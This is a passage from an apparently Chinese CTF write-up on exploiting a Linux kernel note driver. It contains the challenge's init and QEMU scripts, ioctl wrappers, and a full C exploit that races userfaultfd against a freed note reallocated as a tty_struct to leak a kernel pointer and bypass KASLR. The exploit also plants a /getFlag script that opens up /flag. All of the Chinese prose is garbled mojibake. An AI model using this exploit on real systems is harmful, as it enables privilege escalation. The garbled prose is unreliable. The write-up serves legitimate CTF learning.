<p>å› æ­¤ï¼Œ<code>get</code>å‡½æ•°å°±æ˜¯ä»ç”¨æˆ·å†…å­˜ä¸­æ‹·è´å†…å®¹åˆ°åˆ†é…å¥½çš„chunkä¸­ã€‚</p>
<h2 id="add"><a class="markdownIt-Anchor" href="#add"></a> add</h2>
<p><img src="4.png" alt="" /><br />
åœ¨<code>add</code>å‡½æ•°ä¸­ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¸€å¼€å§‹åŠ äº†ä¸€ä¸ªè¯»é”ã€‚åœ¨ä¹‹ååˆåŠ äº†ä¸€ä¸ªå†™é”ã€‚</p>
<p>å‡½æ•°ä¸­è¿˜è°ƒç”¨äº†<code>_InterlockedExchangeAdd</code>å‡½æ•°ï¼Œç¬”è€…æŸ¥åˆ°çš„æ–‡ç« ä¸­å…³äºè¿™ä¸ªå‡½æ•°éƒ½æ˜¯Windowsä¸‹çš„APIï¼Œå¤§æ¦‚çš„å«ä¹‰æ˜¯çº¿ç¨‹äº’é”ä¸‹çš„ç›¸åŠ æ“ä½œã€‚è¿™é‡Œå°†è¯»å†™é”çš„å€¼å‡å»200ï¼ŒåŸå› æš‚æ—¶æœªçŸ¥ã€‚</p>
<p>ä¹‹ååˆ™æ˜¯é€šè¿‡<code>kmalloc</code>è¿›è¡Œå†…æ ¸å †ç©ºé—´åˆ†é…ï¼Œåé¢çš„<code>my_rwlock.raw_lock._anon_0._anon_0.wlocked = 0;</code>åº”è¯¥è¡¨ç¤ºçš„æ˜¯è§£é™¤å†™é”ã€‚</p>
<h2 id="dele"><a class="markdownIt-Anchor" href="#dele"></a> dele</h2>
<p><img src="5.png" alt="" /><br />
å †ç©ºé—´é‡Šæ”¾å‡½æ•°åŒæ ·ä½¿ç”¨äº†è¯»å†™é”ï¼Œåœ¨é‡Šæ”¾ä¹‹åå°†<code>size</code>å’Œ<code>ptr</code>å‡æ¸…ç©ºã€‚</p>
<h2 id="edit"><a class="markdownIt-Anchor" href="#edit"></a> edit</h2>
<p><img src="6.png" alt="" /><br />
è¿™é‡ŒåŒæ ·ä½¿ç”¨äº†<code>copy_user_generic_unrolled</code>è¿™ä¸ªå‡½æ•°ï¼Œä½†æ ¹æ®å‚æ•°æ¥åˆ¤æ–­ï¼Œè¿™é‡Œåº”è¯¥æ˜¯å’Œ<code>copy_to_user</code>å‡½æ•°çš„å«ä¹‰ç›¸åŒã€‚</p>
<h2 id="knote_open"><a class="markdownIt-Anchor" href="#knote_open"></a> knote_open</h2>
<p><img src="7.png" alt="" /><br />
åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼Œé€šè¿‡<code>raw_write_lock</code>å‡½æ•°è®¾å®š<code>my_rwlock</code>ä¸ºå†™é”ï¼Œä¸å…è®¸å…¶ä»–çº¿ç¨‹è¯»å†™<code>in_use</code>ã€‚</p>
<h1 id="0x2-initå’Œstartshæ–‡ä»¶åˆ†æ"><a class="markdownIt-Anchor" href="#0x2-initå’Œstartshæ–‡ä»¶åˆ†æ"></a> 0x2. initå’Œstart.shæ–‡ä»¶åˆ†æ</h1>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line"><span class="built_in">mknod</span> /dev/knote c 10 233</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/knote</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span> . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>åœ¨initæ–‡ä»¶ä¸­ï¼Œæœ‰ä¸€äº›å¸¸è§„çš„ä¿æŠ¤æªæ–½ï¼Œå¦‚è¿™é‡Œçš„<code>kptr_restrict</code>å’Œ<code>dmesg_restrict</code>ï¼Œéƒ½è®¾ä¸º1è¡¨ç¤ºå¯¹æ™®é€šç”¨æˆ·æœ‰é™åˆ¶ä½œç”¨è€Œå¯¹rootç”¨æˆ·æ²¡æœ‰ï¼Œå› æ­¤è°ƒè¯•æ—¶ä¿®æ”¹ä¸ºrootç”¨æˆ·å¯ä»¥æŸ¥çœ‹kallsymsæ–‡ä»¶ã€‚ä¸ä¹‹å‰çš„é¢˜ä¸€æ ·ï¼Œåœ¨è°ƒè¯•æ—¶é€šè¿‡å°†uidæ”¹ä¸º0æ–¹ä¾¿è°ƒè¯•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>
<p>åœ¨start.shæ–‡ä»¶ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å¼€å¯äº†kaslrã€smpä¿æŠ¤ã€‚æ·»åŠ ä¸Š-sé€‰é¡¹ä»¥ä¾›è°ƒè¯•ã€‚</p>
<h1 id="0x3-äº¤äº’ç¼–å†™"><a class="markdownIt-Anchor" href="#0x3-äº¤äº’ç¼–å†™"></a> 0x3. äº¤äº’ç¼–å†™</h1>
<p>é€šè¿‡<code>ioctl</code>å‡½æ•°å¯çŸ¥ï¼Œ<code>mychunk</code>å®é™…ä¸Šå°±æ˜¯æˆ‘ä»¬ä¼ å…¥<code>ioctl</code>å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè¿™ä¸ª<code>chunk</code>ç»“æ„ä½“ä¼šè¢«æ ¹æ®ä¸åŒçš„å‡½æ•°è¿›è¡Œä¸åŒçš„æ“ä½œã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å…ˆå°†ç¨‹åºçš„äº¤äº’å†™å¥½ï¼Œå†å»åˆ†æå…·ä½“çš„æ¼æ´ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .size = size,</span><br><span class="line">            &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x4-æ¼æ´åˆ†æä¸åˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x4-æ¼æ´åˆ†æä¸åˆ©ç”¨"></a> 0x4. æ¼æ´åˆ†æä¸åˆ©ç”¨</h1>
<h2 id="1-é€šè¿‡userfaultfdè·å–å†…æ ¸åŸºåœ°å€"><a class="markdownIt-Anchor" href="#1-é€šè¿‡userfaultfdè·å–å†…æ ¸åŸºåœ°å€"></a> 1. é€šè¿‡<code>userfaultfd</code>è·å–å†…æ ¸åŸºåœ°å€</h2>
<p>åœ¨æœ¬é¢˜ä¸­ï¼Œæ ¸å¿ƒçš„æ“ä½œå°±æ˜¯<code>get</code>ã€<code>add</code>ã€<code>edit</code>ã€<code>dele</code>è¿™4ä¸ªã€‚å…¶ä¸­<code>get</code>å’Œ<code>edit</code>å‡½æ•°æ²¡æœ‰åŠ é”ï¼Œ<code>dele</code>å’Œ<code>add</code>éƒ½åŠ äº†å†™é”ã€‚é€šè¿‡<code>get</code>æˆ–<code>edit</code>å‡½æ•°å¯ä»¥ä¼ å…¥ä¸€ä¸ªmmapå‡ºæ¥çš„ç”¨æˆ·ç©ºé—´ï¼Œç„¶åè§¦å‘<code>userfaultfd</code>ã€‚é‚£ä¹ˆåœ¨æ¡ä»¶ç«äº‰çš„è¿™ä¸ªæ—¶é—´çª—å£ï¼Œæˆ‘ä»¬åˆéœ€è¦åšä»€ä¹ˆå‘¢ï¼Ÿå’Œä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä¹Ÿæ˜¯é‡å¤æ‰“å¼€<code>/dev/ptmx</code>æ–‡ä»¶ï¼Œå°è¯•ä½¿ç”¨åŒæ ·çš„æ–¹æ³•è¿›è¡Œåˆ©ç”¨ã€‚ä¸‹é¢æ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªæµ‹è¯•ç¨‹åºï¼ˆkernel.hè¯·å‚è€ƒ<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I">èµ„æ–™</a>ä¸­æåˆ°çš„é€šç”¨kernel pwnæ¿å­ï¼Œ<code>print_binary</code>è¯·å‚è€ƒç¬”è€…ä¹‹å‰çš„kernel pwnæ–‡ç« ï¼‰ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="8.png" alt="" /><br />
ä¸Šå›¾å°±æ˜¯é€šè¿‡<code>userfaultfd</code>é˜»å¡åè·å–åˆ°çš„éƒ¨åˆ†å†…å­˜å†…å®¹ï¼Œå¯ä»¥å‘ç°è™½ç„¶<code>/dev/ptmx</code>æ‰“å¼€ä¹‹ååˆ†é…äº†<code>ptm_unix98_ops</code>å’Œ<code>pty_unix98_ops</code>ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å‡ºç°<code>tty_operations</code>ä¸­ç‰¹æœ‰çš„é­”æ•°ã€‚</p>
<p><img src="9.png" alt="" /><br />
ä½†æ˜¯åœ¨<code>0x2B0</code>çš„åç§»å¤„æˆ‘ä»¬å‘ç°äº†ä¸€ä¸ªå¯ç–‘çš„å€¼ï¼š<code>0xffffffff91bd4ef0</code>ã€‚ä¸ºä»€ä¹ˆè¯´è¿™ä¸ªå€¼å¾ˆå¯ç–‘å‘¢ï¼Ÿå¦‚æœæˆ‘ä»¬ä½¿ç”¨<code>cat /proc/kallsyms</code>å‘½ä»¤è·å–æ ‡è¯†ç¬¦çš„åœ°å€æ—¶ä¸éš¾å‘ç°ï¼Œç»å¤§å¤šæ•°å†…æ ¸çš„æ ‡è¯†ç¬¦åœ°å€éƒ½æ˜¯ä»¥8ä¸ªfå¼€å¤´çš„ï¼Œè€Œåœ¨æˆ‘ä»¬è·å–åˆ°çš„åœ°å€ä¸­åªæœ‰è¿™ä¸€ä¸ªå€¼å‰é¢è·Ÿä¸Šäº†8ä¸ªfï¼Œå› æ­¤æˆ‘ä»¬æœ‰ç†ç”±æ€€ç–‘è¿™ä¸ªåœ°å€æœ‰å¯èƒ½æ˜¯æŸä¸ªæ ‡è¯†ç¬¦çš„åœ°å€ï¼Œè€Œä¸éœ€è¦å¯¹æˆ‘ä»¬è·å–çš„å…¶ä»–å€¼é€šè¿‡<br />
<code>cat /proc/kallsyms | grep xxx</code>æ¥è¿›è¡ŒæŸ¥æ‰¾äº†ã€‚ä»ä¸Šé¢çš„å›¾ä¸­æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªå€¼ä¹Ÿç¡®å®æ˜¯ä¸€ä¸ªæ ‡è¯†ç¬¦çš„å€¼ï¼š<code>do_SAK_work</code>ï¼Œæˆ‘ä»¬ä¸éœ€è¦ç®¡è¿™ä¸ªæ ‡è¯†ç¬¦çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Œä½†é€šè¿‡è¿™ä¸ªæ ‡è¯†ç¬¦æˆ‘ä»¬å°±å·²ç»èƒ½å¤Ÿè·å–åˆ°å†…æ ¸çš„åŸºå€ï¼Œç»•è¿‡KASLRä¿æŠ¤äº†ã€‚</p>
<p><img src="10.png" alt="" /><br />
åœ¨IDAä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°<code>do_SAK_work</code>åœ¨æœªKASLRæ—¶çš„åœ°å€ã€‚</p>
<p><img src="11.png" alt="" /><br />
